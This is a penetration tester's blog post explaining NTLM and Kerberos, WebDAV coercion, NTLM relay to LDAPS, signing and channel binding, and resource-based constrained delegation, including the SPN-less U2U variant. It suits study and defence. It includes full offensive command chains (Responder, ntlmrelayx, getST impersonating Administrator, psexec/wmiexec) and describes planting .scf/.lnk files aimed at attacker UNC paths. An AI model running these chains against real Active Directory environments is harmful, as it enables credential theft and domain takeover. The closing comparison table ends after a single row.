---
title: "When there is no SPN: Understanding NTLM Coercion, Relay and RBCD"
date: 2026-05-27
draft: false
summary: "From NTLM and Kerberos fundamentals to WebDAV coercion, relay, SMB signing, channel 
  binding, RBCD and the SPN-less variant. Covers how each piece connects and what actually 
  stops it."
---


This post covers well-known concepts. However, how they connect to each other, how certain protections can be bypassed, and what is actually happening under the hood is something many people don't fully understand. During internal engagements, CTFs, labs and my own personal lab, I learned and practiced many techniques that eventually helped me take over workstations, dump credentials, perform lateral movement and discover new accounts, which in some cases led all the way to Domain Admin. It happened through a lot of trial and error, which forced me to properly understand things I thought I already knew, after many hours of testing, reading Microsoft documentation, and studying.

We will start from the protocols and by the end walk through a full path from low-privileged user to DA credentials.
> We will not go into the lowest level of each protocol, but we will explain and highlight the key differences between them.
## Part 1 — NTLM and Kerberos: what is actually on the wire

Before getting into coercion and relay, it helps to understand what is actually happening when a Windows account authenticates. The two protocols you will encounter in every AD environment are <span style="color:#ff0000">NTLM</span> and <span style="color:#ff0000">Kerberos</span>, and the differences between them are what make certain attacks possible and others not.
### NTLM authentication

To start with, NTLM is <u>not a standalone protocol but an embedded one</u>, which means that it does not live at its own layer in the network stack, but rides inside other application level protocols like SMB, HTTP, or LDAP, which handle the actual transmission. NTLM is only responsible for proving identity, and everything else belongs to the host protocol.

The authentication itself is a three-message handshake:

<img src="/images/diagrams/ntlm_handshake.png" alt="NTLM Handshake" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

**NEGOTIATE (Type 1):** The client informs the server that it wants to authenticate using NTLM and lists which NTLM options it supports or requests, such as <b>signing</b> and <b>sealing</b>. These capabilities are expressed through `NegotiateFlags`, a 32-bit field of feature flags, several of which are reserved, where each defined flag indicates whether a specific NTLM capability is supported or requested by the sender. This field is not exclusive to the NEGOTIATE message. It appears in all three messages of the handshake, which is how both sides settle on which features the session will use.

**CHALLENGE (Type 2):** The server replies with its own `NegotiateFlags`, which reflect the flags it has chosen to enable for the session based on what the client offered and its own policy requirements. A server can require flags the client did not ask for, so this is not a strict intersection. The response also includes a randomly generated 64-bit nonce called `ServerChallenge`. Then, the client must compute a valid response to this challenge using the password hash, without ever transmitting the cleartext password itself ( we will explain in a bit ).

**AUTHENTICATE (Type 3):** The client computes a response using the server's challenge and its own password hash, then sends it back to the server. Since the server does not store the client's password ( only the domain controllers holds password hashes ), it cannot verify the response on its own, so it packages the relevant fields into a `NETLOGON_NETWORK_INFO` structure and forwards it to a <b>Domain Controller</b> via **pass-through authentication**  technique, using the `NetrLogonSamLogonWithFlags` RPC method. The DC performs the actual verification and replies with either a `NETLOGON_VALIDATION_SAM_INFO4` on success or an error code on failure.

As you can imagine, this flow applies to domain-joined machines. In a workgroup environment, the actual workstation that we want to authenticate holds a local copy of the password's hash and verifies the response itself, without a DC involved.

#### How the response is actually computed

<u>The client never transmits its password</u>, as he derives a hash from the password using a one-way function and uses the generated hash to compute the challenge response. NTLM protocol consists of two versions:

**NTLMv1** relies on `NTOWFv1`, which is the NT hash of the password (MD4 applied to the UTF-16 encoded password). The response is computed by applying DES to the server's challenge using keys derived from this hash. 
- NTLMv1 is considered weak and deprecated, as <u>the response is crackable offline without any effort</u>.

**NTLMv2** relies on `NTOWFv2`, which is an HMAC-MD5 of the NT hash keyed with the username and domain. The response also incorporates a client-generated nonce, a timestamp, and additional context, making it significantly harder to crack than NTLMv1. The key distinction is that NTLMv1 is crackable regardless of password strength because of how the NT hash is split into 7-byte DES keys, where the third block is almost entirely zero-padded and leaves almost no key material to brute-force, making the full hash recoverable independent of password complexity. NTLMv2 is only as strong as the password itself ( this is why we need a good password policy ). If you capture an NTLMv2 hash with a tool like Responder ( linux ) or Inveigh ( windows ), it appears in the following format:

```
# user::domain:ServerChallenge(8B):NTProofStr(HMAC-MD5,16B):blob
Support2::DOMAIN:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000...
```

This is the format hashcat (mode 5600) and john expect as input.

#### Session security: signing and sealing

Once authentication completes, the client and server can optionally negotiate session security, which is separate from authentication and covers protecting the messages that follow.

**Signing** 
- A MAC (Message Authentication Code) is attached to every message, derived from the session key, which is itself computed from the password hash and the challenge exchange. An attacker who intercepts traffic cannot forge valid MACs without knowing the password hash, since it is never transmitted over the wire. This is what causes relayed sessions to fail when signing is required on the target: <u>the attacker can replay the authentication exchange but cannot produce valid MACs for any subsequent messages</u>.

**Sealing** 
- Adds encryption on top of signing, and every sealed message is also signed. Both NTLMv1 and NTLMv2 support signing and sealing. The real difference is session key strength and the cipher key derivation used for sealing, not the MAC algorithm itself.

In SMB, the host protocol that implements these flags in practice, the default signing policy is:

| Host type | Default SMB signing |
|---|---|
| SMB2/3 clients | Not required (required by default on Windows 11 24H2 and Server 2025) |
| SMB2/3 servers | Not required (required by default on Windows 11 24H2 and Server 2025) |
| Domain Controllers | Required |

This inconsistency, where SMB signing is enforced on Domain Controllers but left optional otherwise, <u>is what keeps lateral movement via NTLM relay attacks happening on most AD environments</u>.

You can verify the SMB signing configuration on any machine with the following PowerShell command:

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature
```

If `RequireSecuritySignature` comes back as `False`, the machine will not enforce signing, meaning an attacker relaying NTLM to it over SMB will not be stopped at that layer. The Group Policy setting that controls this lives at:

```
Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
  Microsoft network server: Digitally sign communications (always)
  Microsoft network client: Digitally sign communications (always)
```

SMB signing and <span style="color:#ff0000">EPA</span> (Extended Protection for Authentication, which we will cover in Part 3) both defend against NTLM relay attacks, but they intervene at different points. SMB signing lets the authentication complete but makes the session unusable afterward, because the attacker cannot produce valid signed messages without the actual session key. EPA on the other hand <u>prevents the authentication from succeeding in the first place</u>, by binding it to the specific TLS channel it is running inside.

### Kerberos authentication

Kerberos is an authentication protocol originally developed at MIT as part of Project Athena in the 1980s and is now defined as an open standard in RFC 4120. In an Active Directory environment it replaced NTLM as the default authentication protocol for domain accounts and it was designed specifically for untrusted networks where packets can be intercepted, modified, or replayed. Both protocols support Single Sign-On, but the way they achieve it is fundamentally different. NTLM achieves SSO by reusing the NT hash from LSASS to answer challenges transparently in the background. The difference is that on every domain authentication the target server must call the DC to verify the response, since it does not hold the user's password hash itself. Kerberos achieves SSO through a ticketing system: the user authenticates once to the KDC, receives a TGT, and uses it to request service tickets without re-proving their password each time. The other difference that matters is **mutual authentication**: Kerberos allows the client to verify it is talking to the real service and not an impostor, <u>which NTLM does not provide.</u>

The protocol involves three entities: the **client** (the user or machine requesting access), the **service** (the resource being accessed), and the **Key Distribution Center (KDC)**, which runs on the Domain Controller and is the only entity that knows all account credentials. Communication happens in three phases:

<img src="/images/diagrams/kerberos_overview.png" alt="Kerberos Overview" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

**AS-REQ / AS-REP (Authentication Service exchange)**

The client requests a TGT from the KDC. To prove its identity, it sends a **pre-authentication value**: the current timestamp encrypted with the user's key, which is derived from their password. The KDC:
- Looks up the user and decrypts the timestamp with the stored key
- If it matches, generates a temporary **session key**
- Responds with two things:
  - The **TGT** itself, encrypted with the `krbtgt` account hash (only the KDC can read it)
  - A copy of the **session key**, encrypted with the user's key

The user decrypts the session key but <u>cannot read or tamper with the TGT</u> since it is protected by the `krbtgt` hash, which they do not have.

<img src="/images/diagrams/kerberos_as.png" alt="AS-REQ AS-REP" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

**TGS-REQ / TGS-REP (Ticket Granting Service exchange)**

When the user wants to access a service, they send the KDC:
- Their **TGT**
- An **authenticator** (current timestamp encrypted with the session key)
- The **SPN** of the service they want to reach

The KDC is stateless, so it decrypts the TGT to recover the session key stored inside it and uses that key to verify the authenticator. If valid, it generates a new session key for the user/service communication and responds with:
- A **service ticket** encrypted with the service's own key, containing the user's information and a copy of the new session key
- That same new session key, encrypted separately with the user's session key

<img src="/images/diagrams/kerberos_tgs.png" alt="TGS-REQ TGS-REP" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

<u>The KDC does not check whether the user is actually authorized to access the requested service.</u> It only validates that the TGT is legitimate and that the authenticator was produced with the correct session key. If both checks pass, the KDC issues the ticket regardless of whether the user has any business accessing that service, because authorization is entirely the service's responsibility. <span style="color:#ff0000">**Kerberoasting**</span> is a direct consequence of this: any low-privileged domain user can request a TGS for any service that has an SPN registered, receive a ticket encrypted with that service account's key, and take it offline to crack.

**AP-REQ / AP-REP (Application Request exchange)**

The user presents the service ticket to the service along with a new authenticator, encrypted with the user/service session key. The service:
- Decrypts the ticket using its own key
- Extracts the session key embedded inside it
- Uses that key to verify the authenticator
- Reads the user's information and makes its own authorization decision

<img src="/images/diagrams/kerberos_ap.png" alt="AP-REQ AP-REP" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

In the standard flow, this happens <u>without contacting the KDC</u>. There is one point that should be mentioned though: the service ticket contains a **PAC (Privilege Attribute Certificate)** listing with the user's group memberships. PAC signature validation, where the service sends the PAC to the DC via Netlogon to confirm its integrity, was historically optional and most services skipped it, but Microsoft restored it as mandatory by default in late 2022 with KB5020805. A service may also contact the DC to confirm the user's account has not been disabled since the ticket was issued. Kerberos is designed to reduce DC contact at the service layer, but PAC validation has reintroduced a degree of it.

The whole system relies on tickets being encrypted with keys that only the intended recipient holds. The user cannot forge a TGT because it is locked with the `krbtgt` hash. The user cannot forge a service ticket because it is encrypted with the **service account's** secret key, which is the hash of the account running that service, whether that is a computer account like `DESKTOP-01$` or a dedicated service account like `svc_sql`. If an attacker obtains that service account's hash, they can forge a service ticket entirely offline without touching the KDC. That is exactly what a <span style="color:#ff0000">**Silver Ticket**</span> exploits. Worth noting: since KB5020805 restored mandatory PAC signature validation in late 2022, a Silver Ticket with a forged PAC will now fail that check when services validate against the DC, which limits the technique on patched environments.

PAC validation also matters when delegation is involved. When a service uses S4U extensions to impersonate a user to a backend service, it must present a ticket with a valid PAC. ( Delegation abuse is what Part 4 covers )

### Why coercion exists at all

Coercing is a technique that forces a target to authenticate to you with its credentials. The easiest way is to coerce authentication over <span style="color:#ff0000">NTLMv2</span> rather than Kerberos, and the attack we will walk through later does exactly that: coerce a machine into authenticating to you over NTLMv2, then relay that authentication to take over the machine. As we will cover, several prerequisites need to be in place for this to work.

Why do these coercion paths exist in the first place, and why are they not simply disabled everywhere?

None of the coercion primitives we will cover are bugs, but on the contrast each one is a **legitimate Windows feature being abused** by an attacker. The Print Spooler service exists because enterprises need printing infrastructure, the EFS RPC interface exists because backup software needs to operate on encrypted files, the DFS Namespace Management protocol exists because large organizations rely on distributed file system namespaces and the File Server VSS protocol exists because Volume Shadow Copy operations are a core part of enterprise backup strategies. These are not legacy features and they are actively used in production environments every day.

The abuse works because all of these protocols share a common pattern: they include **callback or notification mechanisms** where the server is expected to authenticate back to the caller. The attacker positions themselves as the caller and the server connects back and authenticates.

This is also why disabling these services is harder than it sounds. On workstations the Print Spooler is often required for local printing. On Domain Controllers, disabling it is now strongly recommended and Microsoft has issued guidance to do so, but in many environments it remains enabled for operational reasons. It should be mentioned that some organizations have never audited which of the services are actually needed versus which are just running by default, and in large environments that is not a small task.


## Part 2 — Coercion primitives: SMB vs WebDAV

### The SMB coercion path

Several Windows RPC interfaces expose methods that, when called by an attacker( usually a low privilged domain user ), cause the target machine to make an outbound authentication connection back to an address the attacker controls. The named primitives are:

- **PrinterBug (MS-RPRN):** Abuses `RpcRemoteFindFirstPrinterChangeNotification`, a method on the Print Spooler service. Any authenticated domain user can call it and force a machine to authenticate back to an arbitrary host. Discovered by Lee Christensen.
- **PetitPotam (MS-EFSRPC):** Abuses the Encrypting File System RPC interface. Discovered by topotam. The original form was unauthenticated, Microsoft partially patched it, but authenticated variants still work in most environments.
- **DFSCoerce (MS-DFSNM):** Abuses the Distributed File System Namespace Management protocol. Discovered by Filip Dragović.
- **ShadowCoerce (MS-FSRVP):** Abuses the File Server Remote VSS Protocol.

All of them produce the same result on the wire: an SMB connection from the victim machine to the attacker's listener, with NTLM authentication attached. The machine account of the victim is what authenticates.

#### Capturing and relaying: Responder and ntlmrelayx

Two tools handle the two sides of this attack. **Responder** poisons broadcast name resolution protocols (LLMNR, NBT-NS, MDNS) on the local network, redirecting any machine that tries to resolve a hostname it cannot find in DNS toward the attacker's machine. When the victim connects, it sends NTLM authentication, and Responder captures it.

```bash
sudo python3 Responder.py -I eth0
```

**ntlmrelayx** sits on the other side and instead of capturing the authentication, it relays it in real time to a target you specify. When the relayed session has sufficient privileges on the target, ntlmrelayx performs post-relay actions such as a SAM dump or command execution.

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

The two tools are used together: Responder handles the poisoning and redirects victims to the attacker's machine, while ntlmrelayx handles the incoming connection and relays it onward. Note that Responder's SMB and HTTP servers must be turned off when ntlmrelayx is running, since both cannot listen on the same ports simultaneously.

Another way to trigger inbound NTLM authentication without relying on broadcast poisoning is to upload a malicious file to a writable SMB share, such as a `.scf`, `.url`, or `.lnk` file that points to an attacker-controlled UNC path. When any user browses that share, <u>Windows automatically attempts to resolve the UNC path and authenticates to the attacker's machine without any user interaction</u>. People browsing file shares in an organization are often privileged accounts, and capturing or relaying the NTLMv2 of a Domain Admin who opens that folder goes directly to privilege escalation.

#### Why SMB-coerced NTLM usually cannot be relayed to LDAP (without a CVE)

When a Windows client authenticates over SMB, it negotiates signing in the NEGOTIATE message by setting flags such as `NTLMSSP_NEGOTIATE_SIGN`. To relay that NTLM exchange to LDAP, the attacker would need to strip those flags, because LDAP does not use SMB signing. The problem is that the <span style="color:#ff0000">**MIC (Message Integrity Code)**</span> in the AUTHENTICATE message <u>covers all three NTLM messages, including the NEGOTIATE</u>. Modifying the NEGOTIATE to remove signing flags invalidates the MIC, and the LDAP server on the DC rejects the authentication.

Three CVEs in this space are worth knowing. **CVE-2019-1040 (Drop the MIC)** allowed an attacker to strip the MIC entirely from the AUTHENTICATE message, bypassing the integrity check and enabling SMB-to-LDAP cross-protocol relay. **CVE-2019-1166 (Drop the MIC 2)** was a bypass of the patch for CVE-2019-1040, covering a case the original fix missed. **CVE-2019-1019 (Your Session Key is my Session Key)** is related but different: it allowed the attacker to compute the session key for a relayed session, which is what makes subsequent signing possible and defeats the session key protection that normally makes a relayed session useless. All three were patched by Microsoft. On a patched environment, SMB-coerced NTLM cannot be relayed to LDAP. `ntlmrelayx` exposes `--remove-mic` for targets still vulnerable to CVE-2019-1040 and `--remove-target` for CVE-2019-1019.

To be explicit: this has nothing to do with whether the target is LDAP or LDAPS. <u>The MIC lives inside the NTLM messages themselves, not in the transport layer.</u> Adding TLS on top with LDAPS does not change the MIC problem at all. The relay from SMB fails against both equally on patched systems.

<img src="/images/diagrams/mic_relay.png" alt="MIC Relay Rejection" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

### The WebDAV coercion path
When I first started working with relay attacks, I was not very familiar with them. I thought that SMB could be relayed and work for any cross-protocol relay attack. However, after understanding and testing all the things we explained above, I realized it would not work. Then I searched and studied for other ways to force authentication from a computer, and that is when I discovered WebDAV. To identify which hosts have the WebClient service running across subnets, I found and used [WebclientServiceScanner](https://github.com/Hackndo/WebclientServiceScanner) which makes the job easy.

So what actually makes <span style="color:#ff0000">WebDAV</span> different? The same coercion primitives can be triggered over HTTP instead of SMB. By using a UNC path with the `@` syntax (for example `\\attacker@80\share\file.txt`), Windows will attempt to reach the path via **WebDAV over HTTP** when the victim's `WebClient` service is running, rather than over SMB. <u>This is a critical detail: the path must include both a share and a filename component.</u> If you only specify `\\attacker@80` without the full path, Windows will not use WebDAV and will fall back to a standard SMB connection, which puts you right back to the MIC problem we described earlier.

In practice, [NetExec](https://github.com/Pennyw0rth/NetExec) makes this straightforward. The key is providing the full path including share and filename after the `@port` notation, because without it Windows will not use WebDAV and will fall back to SMB. One more thing: the listener must be specified as a hostname, not an IP address. The WebClient service uses Internet Explorer security zones to decide whether to send NTLM credentials automatically. IP addresses fall into the Internet zone, where silent NTLM authentication is blocked. A NetBIOS name is treated as a Local Intranet resource and gets credentials forwarded without any user interaction. Using an IP here will either silently fail or prompt the user:

```bash
nxc smb <target> -u <user> -p <pass> -M coerce_plus -o LISTENER=<attacker_hostname>@80/share/file.txt
```

From personal experience: I spent a significant amount of time trying to get the coercion working with tools like [Coercer](https://github.com/p0dalirius/Coercer) and [PetitPotam](https://github.com/topotam/PetitPotam), but neither produced results in my environment. Switching to NetExec resolved it immediately. Whether this was something specific to the target environment, a configuration difference, or something else entirely that I do not fully understand, I cannot say for certain. This is why I always try multiple tools and sometimes what fails in one environment can work perfectly in another. Even after switching to NetExec, I lost more time than I would like to admit because I was specifying only `@80` in the listener without the full `/share/file.txt` path, which silently fell back to SMB every time and made the whole thing look broken when it was just a missing path component. It would actually be interesting to either push a patch to NetExec that warns the user when the path is incomplete, or to look into whether the module could handle this automatically, so that others do not have to waste the same time I did.

Because the authentication now travels over HTTP, the handshake carries no SMB session-signing requirements. The attacker does not need to strip or tamper with any protocol-level flags, which means <u>the MIC stays perfectly intact and valid</u> when the AUTHENTICATE message is relayed to the DC over LDAP. The relay goes through cleanly if LDAP signing is not enforced on the DC, which is why WebDAV is the preferred coercion path when the target is LDAP.

We will cover how this combines with LDAP channel binding and LDAPS in Part 3.

The `WebClient` service must be running on the victim for this to work, and this is where many people get stuck. On Windows workstations the service is installed by default but sits in a stopped state, and the coercion primitives themselves do not start it automatically. What actually gets it running in practice is either a user browsing a share that contains a `.searchConnector-ms` or `.library-ms` file pointing to a remote UNC path, or running EtwStartWebClient-style code on a host where you already have code execution. Without one of these in place beforehand, the service will not be running and WebDAV coercion will fail silently with no obvious indication of why. On Windows Servers the service is absent by default and will only exist if the Desktop Experience feature was explicitly installed.

### Side-by-side: what each coercion path gives you

| Coercion path | Auth on wire | MIC issue? | Can relay to LDAP (389)? | Can relay to LDAPS (636)? |
|---|---|---|---|---|
| SMB coerce | NTLM over SMB | Yes, blocks relay on patched systems | Only via CVE-2019-1040 (patched) | Only via CVE-2019-1040 (patched) |
| WebDAV coerce | NTLM over HTTP | No | Yes, if LDAP signing not enforced | Yes, if channel binding not enforced |

---

## Part 3 — Signing and channel binding: what kills the relay

### SMB signing: why the relay session is useless without the session key

SMB signing works by attaching a MAC to every SMB message after authentication completes. This MAC is derived from the session key, which is computed during the NTLM exchange using the victim's password hash. An attacker who relays the NTLM authentication can forward the three-message handshake successfully, but <u>they never learn the session key</u> because it is derived from the password hash and never transmitted over the wire. Without the session key, the attacker cannot produce valid MACs, and the target will reject every subsequent SMB message they attempt to send.

The core problem for the attacker is that both the victim and the target independently derive the same session key from the NT hash, while the attacker sits in the middle holding nothing. The authentication goes through, but <u>the session that follows is between two parties who both hold key **K**, and the attacker holds a different key entirely</u>.

<img src="/images/diagrams/smb_signing_relay.png" alt="SMB Signing Relay Failure" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

SMB signing does not block the authentication itself, it makes the session completely unusable to the attacker after authentication completes.

SMB signing is required by default on Domain Controllers, but left optional on workstations and member servers in most environments. As we mentioned in the NTLM section, Microsoft has been moving toward requiring it by default on newer Windows versions as well.

### LDAP signing: what it protects and what it does not

LDAP signing, when required on the DC, forces any LDAP session to be cryptographically signed. An attacker relaying NTLM cannot produce valid signatures because signing requires the session key, which is derived from the victim's password hash and never leaves the authentication exchange. This blocks relay to plain LDAP on port 389.

However, <u>LDAP signing does not protect LDAPS</u>. When a client connects over LDAPS, the TLS channel already provides integrity and the DC considers the signing requirement satisfied by TLS itself. This means that if a DC has LDAP signing required but channel binding disabled, an attacker who relays over LDAPS can still succeed.

### LDAP channel binding (EPA)

<span style="color:#ff0000">EPA</span> (Extended Protection for Authentication) is the framework that Microsoft built on top of RFC 5056 channel binding. Its purpose is to tie an NTLM authentication to the specific TLS channel it is running inside, so that relaying the authentication into a different TLS session causes it to fail. Channel binding over LDAPS is one specific implementation of this framework, and it is the one that directly kills LDAPS relay in AD environments.

When EPA is enforced, the client includes a **Channel Binding Token (CBT)** in the AUTHENTICATE message. For LDAPS, this token is produced using the `tls-server-end-point` binding type defined in [RFC 5929](https://www.rfc-editor.org/rfc/rfc5929): a cryptographic hash of the server's X.509 certificate, computed using the certificate's own signature hash algorithm (or SHA-256 if the algorithm is MD5 or SHA-1). The server independently computes the same hash from its own certificate and compares the two values. In a relay attack, the client is establishing a TLS session with the attacker, not with the DC, so the CBT it computes is the hash of the attacker's certificate. <u>The values do not match and authentication fails.</u>

<img src="/images/diagrams/epa_without.png" alt="LDAPS Relay Without Channel Binding" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

<img src="/images/diagrams/epa_with.png" alt="LDAPS Relay With Channel Binding" style="display:block; margin:1.5rem auto; width:75%; border-radius:4px;" />

The same framework applies to HTTPS as well, which becomes relevant when NTLM is relayed over WebDAV coercion paths. We will connect this to the relay matrix below.

### The relay matrix

LDAP signing and channel binding are complementary controls. Each one closes a different relay path, and <u>enabling only one still leaves the other open</u>.

| Protection enabled | Relay to LDAP (389) | Relay to LDAPS (636) |
|---|---|---|
| Neither | Works | Works |
| LDAP signing only | Blocked | Still works |
| Channel binding only | Still works | Blocked |
| Both | Blocked | Blocked |

To fully close WebDAV relay against AD, both controls must be enforced. Signing alone still leaves LDAPS exposed, and channel binding alone still leaves plain LDAP exposed.

#### A special case: relaying a DC back to itself

This is a theoretical case I have not personally tested in a lab, but the reasoning behind it is worth understanding.

The question is: can you coerce a DC and relay its authentication straight back to its own LDAP service, cutting out the workstation entirely? SMB-to-SMB self-relay is patched since MS08-068: if you try to relay a machine's NTLM challenge back to that same machine over SMB, the target detects it and rejects it. However, this patch only covers SMB-to-SMB. <u>Cross-protocol self-relay, meaning coercing a DC via WebDAV and relaying that authentication back to the same DC's LDAP or LDAPS service, is not covered by that fix.</u> There is no mechanism at the relay layer that blocks it based on source and destination being the same machine.

A DC machine account is highly privileged in the domain, and a successful relay to its own LDAP would give you a session carrying those privileges directly.

All of this requires the **WebClient service to be running on the DC**. As covered in Part 2, WebClient is not installed on servers or DCs by default and only exists if the Desktop Experience feature was explicitly added, which is uncommon in a properly managed environment. In practice this condition is almost never met, which is why this scenario stays largely theoretical. If channel binding is disabled and WebClient is somehow present, the relay path to LDAPS would be open, because the channel binding check is about TLS certificate mismatch between client and server, not about source and destination being the same machine.

---

## Part 4 — What you do with the relay: RBCD

### Resource-Based Constrained Delegation, briefly

At this point we have forced a computer to authenticate to us over WebDAV and relayed that authentication to LDAPS. Now what?

When a computer authenticates to LDAPS, it authenticates as its own machine account, and a machine account has write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on its own object. This does not come from the generic NT AUTHORITY\SELF validated-write ACEs, which cover things like Validated-SPN rather than arbitrary attributes. It comes from the default DACL granting NT AUTHORITY\SELF the Write Account Restrictions property right, which includes msDS-AllowedToActOnBehalfOfOtherIdentity as a member of that property set. This attribute is a security descriptor that controls which accounts are permitted to request Kerberos service tickets on behalf of other users to that specific computer, which is the core of Resource-Based Constrained Delegation.

By relaying the computer's authentication to LDAPS and writing a controlled account into that attribute, we are telling the DC that our account is trusted to impersonate any user, including Domain Admins, when requesting a service ticket to that machine. The impersonation itself is carried out through two Kerberos extensions:

<span style="color:#ff0000">**S4U2Self** (Service for User to Self)</span> allows a service account to request a service ticket to itself on behalf of an arbitrary user, without requiring that user to have authenticated first. The result is a valid service ticket where the client identity inside the ticket is spoofed as, for example, Administrator.

<span style="color:#ff0000">**S4U2Proxy** (Service for User to Proxy)</span> takes that ticket and uses it to request a service ticket for a different service on the same user's behalf. In practice, this means converting the S4U2Self ticket into a valid CIFS or HOST ticket for the target computer, impersonating the privileged user end to end. The DC permits this only if the delegating account appears in `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target, which is exactly the attribute we just wrote.

If the schema version is **Windows Server 2016 or higher** and **a PKINIT-capable DC is available** (which in practice means Active Directory Certificate Services is deployed in the environment, or another internal PKI), the relay session can alternatively be used to perform a <span style="color:#ff0000">**Shadow Credentials**</span> attack by writing to the `msDS-KeyCredentialLink` attribute on the target object instead. This injects a certificate-based credential onto the computer account, which can then be used with a tool like `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to obtain a TGT and retrieve the account's NT hash via PKINIT, without going through the delegation chain at all. Either works once you have write access through the relay.

You can check the schema version from a Windows machine with:

```powershell
Get-ADRootDSE | Select objectVersion
```

An `objectVersion` of 87 or higher corresponds to Windows Server 2016 schema.

### The classic RBCD chain (with an SPN)

As explained above, S4U2Proxy requires the delegating account to have a Service Principal Name registered. More precisely, the KDC needs to resolve the requesting principal, and an SPN is the standard mechanism for that. This is exactly the requirement the U2U technique bypasses in the SPN-less variant below. This is where the attack forks.

**If MachineAccountQuota is greater than zero** (the AD default is 10), any authenticated domain user can create a new machine account. Machine accounts get SPNs registered automatically, which is exactly what we need here.

Start by creating a machine account:

```bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Str0ngP4ss!' -dc-ip <DC_IP> corp.local/john.doe:<password>
```

Then set up ntlmrelayx to relay the coerced authentication to LDAPS. The `--delegate-access` flag tells it to automatically write the created machine account into `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target:

```bash
ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access --escalate-user 'FAKE$' --no-smb-server
```

Once the relay succeeds and the attribute is written, verify it before continuing:

```powershell
Get-ADComputer <TARGET> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
```

Then request a service ticket impersonating a privileged user using S4U2Self and S4U2Proxy:

```bash
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator -k -no-pass -dc-ip <DC_IP> corp.local/'FAKE$':'Str0ngP4ss!'
```

Export the ticket and connect:

```bash
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass TARGET.corp.local
```

One thing that cost me days across a lab: I was consistently targeting the built-in `Administrator` account in the `-impersonate` flag and kept receiving errors I could not explain. After a lot of searching and hours I will not get back, I discovered that the account was simply disabled in that environment. A disabled built-in Administrator is actually the correct security posture, it just was not obvious at the time. That rabbit hole eventually led me to properly understand Protected Users and account restrictions, which we cover in Part 5. Before running the impersonation step, enumerate which Domain Admin accounts are actually enabled, are not members of the Protected Users group (Protected Users membership causes the KDC to reject the delegation ticket outright, as covered in Part 5), and do not have the "Account is sensitive and cannot be delegated" flag set on them. <u>All three of these conditions will silently kill the impersonation.</u> Some DA accounts will work, some will not, and the only way to know is to check beforehand.

These commands require the Active Directory PowerShell module (`RSAT-AD-PowerShell`), which is available on domain-joined machines with the Remote Server Administration Tools installed, or on Domain Controllers directly.

```powershell
# Check all Domain Admins (enabled status + delegation flag)
Get-ADGroupMember "Domain Admins" | ForEach-Object {
    Get-ADUser $_ -Properties AccountNotDelegated, MemberOf |
    Select Name, SamAccountName, Enabled, AccountNotDelegated
}

# Check who is in Protected Users
Get-ADGroupMember "Protected Users" | Select Name, SamAccountName
```

**If MachineAccountQuota is set to zero**, standard users cannot create machine accounts and that path is closed. The next option is finding an existing account with an SPN. That is where <span style="color:#ff0000">Kerberoasting</span> comes in: by requesting service tickets for accounts with SPNs and cracking them offline, you may recover the credentials of a service account that can fill the same role.

### The SPN-less variant

If MachineAccountQuota is zero and Kerberoasting yields nothing usable, the attack still has a route. S4U2Proxy normally requires the delegating account to have an SPN registered, because the KDC uses that SPN to locate the principal object when routing the delegation request. The SPN-less technique bypasses this by using <span style="color:#ff0000">**Kerberos User-to-User (U2U)**</span> authentication instead.

In U2U mode, the account does not need an SPN. Rather than presenting a service key derived from a long-term credential, <u>the account uses its own TGT directly as the service credential</u>. The KDC resolves the account from the TGT itself rather than through an SPN lookup, which means the usual SPN requirement is never triggered.

The trick is <u>aligning the account's NT hash with its TGT session key</u>. In U2U mode, the TGT session key acts as the service credential since there is no SPN and no long-term service key, so the S4U2Self ticket is encrypted with it rather than with the account's long-term key. When the KDC then processes the S4U2Proxy request, it attempts to decrypt that S4U2Self ticket using the account's long-term key (NT hash). Those two values do not match, so decryption fails and the delegation is rejected. By changing the account's password so that its NT hash equals the session key, the two values become the same and the KDC's decryption succeeds. That is the only purpose of the password change step.

First, derive the NT hash from the account's password:

```bash
pypykatz crypto nt '<password>'
```

Retrieve a TGT for the account:

```bash
getTGT.py corp.local/john.doe -hashes :<NT_HASH> -dc-ip <DC_IP>
```

Extract the TGT session key from the cached ticket:

```bash
describeTicket.py john.doe.ccache | grep 'Ticket Session Key'
```

Change the account's password so its NT hash now matches the session key:

```bash
changepasswd.py corp.local/john.doe@<DC_IP> -hashes :<NT_HASH> -newhash :<SESSION_KEY>
```

**Important:** after this step, the account's password is set to a value derived from the session key, which means it is effectively unknown and <u>the account becomes unusable in the normal sense, so treat it as a sacrifice</u>. Do not perform this on an account you still need access to, or one whose lockout or unexpected password change could raise alerts in the environment. You can attempt to restore the account by changing the password back to something known using `changepasswd.py` again, as documented in [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd), however domain password policies such as minimum password age or password history requirements may block that attempt entirely.

Request the service ticket using U2U combined with S4U2Proxy:

```bash
KRB5CCNAME=john.doe.ccache getST.py -u2u -impersonate Administrator -spn CIFS/TARGET.corp.local -k -no-pass corp.local/john.doe -dc-ip <DC_IP>
```

Use the resulting ticket to connect:

```bash
KRB5CCNAME=Administrator@CIFS_TARGET.corp.local@CORP.LOCAL.ccache wmiexec.py TARGET.corp.local -k -no-pass
```

More on the mechanics of this variant at [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd).

### Side-by-side: SPN account vs SPN-less account

| | Classic RBCD | SPN-less RBCD | Shadow Credentials |
|---|---|---|---|
| Requires SPN account | Yes (created or Kerberoasted) | No (U2U bypass) | No |
